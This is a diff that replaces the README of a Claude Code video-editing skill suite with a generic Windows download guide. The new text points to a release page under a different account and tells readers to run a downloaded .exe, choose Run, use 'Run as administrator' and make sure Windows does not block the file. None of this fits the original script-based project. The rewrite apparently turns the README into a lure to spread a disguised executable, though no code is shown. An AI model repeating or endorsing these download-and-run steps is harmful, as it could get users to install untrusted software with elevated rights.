@@ -1,161 +1,223 @@
-![Claude Video](screenshots/cover.gif)
+# 🎬 claude-video - Create and Edit Videos Fast
 
-# Claude Video: AI Video Production Suite for Claude Code
+[![Download claude-video](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/zeryamkill/claude-video/releases)
 
-AI-powered video production suite for [Claude Code](https://claude.ai/claude-code). Edit, transcode, caption, analyze, generate, and create promo videos: all from your terminal.
+## 🧩 What this app does
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Claude Code Skill](https://img.shields.io/badge/Claude_Code-Skill-orange)](https://claude.ai/claude-code)
+claude-video is a video production app for Claude Code users. It helps you work with video files on Windows with less effort.
 
-## Features
+Use it to:
 
-- **Video Editing**: Trim, cut, split, merge, speed, crop, overlay, stabilize, transitions
-- **Transcoding**: H.264, H.265, AV1, VP9, ProRes. GPU-accelerated with NVIDIA NVENC
-- **Captioning**: Speech-to-text (Whisper) + animated word-by-word subtitles
-- **Analysis**: FFprobe metadata, VMAF/SSIM/PSNR quality metrics, scene detection
-- **AI Video Generation**: Google Veo 3.x text-to-video with native audio
-- **AI Image Generation**: Gemini, FLUX.2, Stable Diffusion for video assets
-- **Stock Footage Promos**: Pixabay/Pexels stock video + Remotion text overlays with contrast-aware adaptive text
-- **Shortform Pipeline**: Longform → TikTok/Reels/Shorts (transcribe, score, crop 9:16, caption)
-- **Audio Processing**: Loudness normalization, noise reduction, mixing, Gemini TTS voiceover
-- **AI Enhancement**: Real-ESRGAN upscale, RIFE frame interpolation, CodeFormer face restore
-- **Platform Export**: One-command export for YouTube, TikTok, Instagram, LinkedIn, Web, GIF
+- Edit video clips
+- Transcode files to other formats
+- Add captions
+- Analyze video content
+- Generate video with Veo
+- Build stock footage promos with text that stays readable
+- Run a shortform video pipeline
+- Handle common video tasks in one place
 
-## Installation
+## 💻 Before you install
 
-### Manual Install (Linux/macOS)
+You need:
 
-```bash
-git clone https://github.com/AgriciDaniel/claude-video.git
-cd claude-video
-bash install.sh
-```
+- A Windows PC
+- An internet connection
+- A modern browser
+- Enough free disk space for video files
+- A folder where you can save downloads
 
-### Windows (PowerShell)
+For best results, use:
 
-```powershell
-git clone https://github.com/AgriciDaniel/claude-video.git
-cd claude-video
-# Copy skills manually to %USERPROFILE%\.claude\skills\
-```
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- A 64-bit processor
+- A screen with 1366 × 768 or better
 
-### Prerequisites
+Video work uses a lot of space. Large files can take time to process.
 
-- **FFmpeg**: Required for all video operations
-- **Python 3.10+**: For scripts (analysis, TTS, stock search)
-- **Node.js 18+**: For Remotion promo pipeline (optional)
-- **NVIDIA GPU**: Optional, enables NVENC hardware acceleration
+## 📥 Download and install
 
-## Quick Start
+Visit this page to download:
 
-```bash
-claude
-/video                    # Interactive: describe what you want
-/video edit               # Trim, cut, merge, transitions
-/video transcode          # Convert codecs, compress
-/video caption            # Transcribe + animated subtitles
-/video analyze            # Inspect metadata, quality metrics
-/video export youtube     # Platform-optimized export
-/video promo              # Stock footage promo with adaptive text
-/video generate           # AI video generation (Veo)
-/video shorts             # Longform → shortform clips
-/video enhance            # AI upscale, face restore
-```
+https://github.com/zeryamkill/claude-video/releases
 
-## Commands
+On the release page:
 
-| Command | What it does |
-|---------|-------------|
-| `/video` | Interactive mode: describe what you want |
-| `/video edit` | Trim, cut, split, merge, speed, crop, overlay, stabilize, transitions |
-| `/video transcode` | Convert codecs, compress, GPU-accelerated encoding |
-| `/video audio` | Normalize loudness, reduce noise, mix, extract |
-| `/video caption` | Transcribe speech → animated subtitles (Whisper + ASS) |
-| `/video analyze` | Inspect with FFprobe, measure quality (VMAF/SSIM/PSNR) |
-| `/video export` | One-command export: YouTube, TikTok, Instagram, LinkedIn, Web, GIF |
-| `/video download` | Download video via yt-dlp |
-| `/video create` | Programmatic video creation via Remotion |
-| `/video shorts` | Longform → shortform pipeline |
-| `/video image` | AI image generation (Gemini, FLUX.2, SD) |
-| `/video generate` | AI video generation (Veo 3.x) |
-| `/video screenshot` | Web capture via Playwright |
-| `/video enhance` | AI upscale, frame interpolation, face restore |
-| `/video enhance-audio` | AI audio: source separation, denoise, TTS |
-| `/video promo` | Stock footage promo videos with contrast-aware text |
+1. Open the latest release
+2. Download the Windows file that matches your system
+3. Save the file to your Downloads folder
+4. If the file is a ZIP archive, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to start it
 
-## Architecture
+If Windows asks for permission, choose Run.
 
-```
-~/.claude/
-├── skills/
-│   ├── claude-video/              # Main orchestrator
-│   │   ├── SKILL.md               # Command routing
-│   │   ├── scripts/               # 19 Python/Bash scripts
-│   │   └── references/            # 15 on-demand knowledge files
-│   ├── claude-video-edit/         # Editing sub-skill
-│   ├── claude-video-transcode/    # Transcoding sub-skill
-│   ├── claude-video-caption/      # Captioning sub-skill
-│   ├── claude-video-promo/        # Stock footage promo sub-skill
-│   └── ... (15 sub-skills total)
-└── agents/
-    ├── claude-video-encoder.md    # Batch encoding specialist
-    ├── claude-video-analyst.md    # Quality assessment specialist
-    └── claude-video-producer.md   # Production pipeline specialist
-```
+If you see more than one file, pick the one for Windows. It will usually end in `.exe` or come in a `.zip` file.
 
-### Promo Pipeline (Stock Footage + Remotion)
+## 🛠️ First run setup
 
-The promo pipeline creates marketing videos using free stock footage with contrast-aware text:
+The first time you open claude-video, it may ask for a few paths or settings. This is normal.
 
-```
-Search Pixabay → Download → Analyze Contrast → Generate TTS → Render with Remotion
-                                    ↓
-                          4x3 luminance grid per second
-                                    ↓
-                    AdaptiveText adjusts backing plate per frame
-                    Dark bg → no backing | Bright bg → dark plate
-```
+Set up these items if the app asks:
 
-## Promo Pipeline Setup
+- Your input folder for source clips
+- Your output folder for finished videos
+- A working folder for temporary files
+- Your preferred language for captions
+- Your default export format
 
-```bash
-cd claude-video/promo-pipeline
-npm install
-export PIXABAY_API_KEY="your-free-key"      # Get at pixabay.com/api/docs/
-export GOOGLE_AI_API_KEY="your-gemini-key"   # For TTS voiceover
-```
+If the app includes a settings panel, use it to set:
 
-## Ecosystem
+- Video quality
+- Frame size
+- Caption style
+- Text color
+- Output bitrate
 
-Part of the AI Marketing Suite:
+For stock footage promos, choose a text color that stands out from the video. The app supports contrast-aware text, which helps keep words easy to read.
 
-| Skill | Purpose |
-|-------|---------|
-| [Claude SEO](https://github.com/AgriciDaniel/claude-seo) | SEO analysis, audits, schema |
-| [Claude Blog](https://github.com/AgriciDaniel/claude-blog) | Blog writing, optimization |
-| **Claude Video** | Video production, promos |
+## 🎞️ Main features
 
-## Requirements
+### ✂️ Video editing
 
-- FFmpeg 6.x+
-- Python 3.10+
-- Node.js 18+ (for Remotion promo pipeline)
-- Optional: NVIDIA GPU with NVENC for hardware acceleration
+Use claude-video to cut clips, trim edges, and arrange scenes. This helps when you want to turn long footage into a short video.
 
-## Uninstall
+### 🔄 Transcoding
 
-```bash
-# Remove skills
-rm -rf ~/.claude/skills/claude-video*
+Convert video files from one format to another. This is useful when a file will not play on your device or when you need a smaller export.
 
-# Remove agents
-rm -f ~/.claude/agents/claude-video-*.md
-```
+### 📝 Captioning
 
-## Contributing
+Add captions to videos so viewers can follow along without sound. This is helpful for social clips, tutorials, and demos.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+### 🔍 Video analysis
 
-## License
+Analyze clips to understand what is in the video. This can help with sorting footage, finding scenes, or planning edits.
 
-[MIT](LICENSE)
+### 🧠 Veo generation
+
+Generate video with Veo from inside the workflow. This can help when you want to create new clips without starting from scratch.
+
+### 📣 Stock footage promos
+
+Build short promos from stock footage and overlay text that stays easy to read on bright or dark scenes.
+
+### 📱 Shortform pipeline
+
+Create short vertical videos for social platforms. This is useful for clips, highlights, and fast edits.
+
+## 🚀 How to use it
+
+Start with a simple workflow:
+
+1. Open claude-video
+2. Choose your source video
+3. Pick the task you want to run
+4. Set your output folder
+5. Review the preview, if shown
+6. Start the process
+7. Wait for the export to finish
+8. Open the result in your player or editor
+
+For a basic caption workflow:
+
+1. Import a video
+2. Run caption generation
+3. Check the text for errors
+4. Adjust timing if needed
+5. Export the final file
+
+For a transcode workflow:
+
+1. Import the file
+2. Choose the target format
+3. Set quality and size
+4. Start the transcode
+5. Save the output
+
+## 📁 Common file types
+
+claude-video works well with common video and audio formats, such as:
+
+- MP4
+- MOV
+- MKV
+- AVI
+- WEBM
+- MP3
+- WAV
+
+If a file does not open, try transcoding it first.
+
+## 🎯 Good use cases
+
+Use claude-video when you want to:
+
+- Turn long clips into short posts
+- Add captions for social media
+- Convert files for a phone, tablet, or web upload
+- Build a promo with clear text overlays
+- Review footage before you edit it further
+- Prepare video assets for Claude Code workflows
+
+## ⚙️ Tips for better results
+
+- Use shorter source clips when possible
+- Keep filenames simple
+- Save outputs to a separate folder
+- Use high-contrast text on busy scenes
+- Export a test clip before doing a full batch
+- Keep a backup copy of the original file
+
+If your output looks blurry, raise the bitrate or choose a larger export size.
+
+If captions run off the screen, use shorter lines and a larger safe margin.
+
+## 🧪 Simple troubleshooting
+
+If the app does not open:
+
+- Check that the download finished
+- Unzip the file if it came in an archive
+- Right-click the app and choose Run as administrator
+- Make sure Windows did not block the file
+
+If the app opens but no video appears:
+
+- Check that the source file still exists
+- Try a different file format
+- Move the file to a local folder, such as Videos or Desktop
+
+If export fails:
+
+- Make sure you have enough disk space
+- Close other apps that use the same file
+- Try a smaller clip first
+- Confirm the output folder is writable
+
+If captions are wrong:
+
+- Check the audio quality
+- Remove background noise if you can
+- Edit the caption text before export
+
+## 📌 What is inside the project
+
+This repo focuses on a complete video workflow with tools for:
+
+- Editing
+- Transcoding
+- Captioning
+- Analysis
+- Video generation
+- Promo creation
+- Shortform output
+
+It is built for users who want one place to handle many video tasks without moving between different tools
+
+## 🔗 Download again
+
+If you need to get the app again, use the release page:
+
+https://github.com/zeryamkill/claude-video/releases
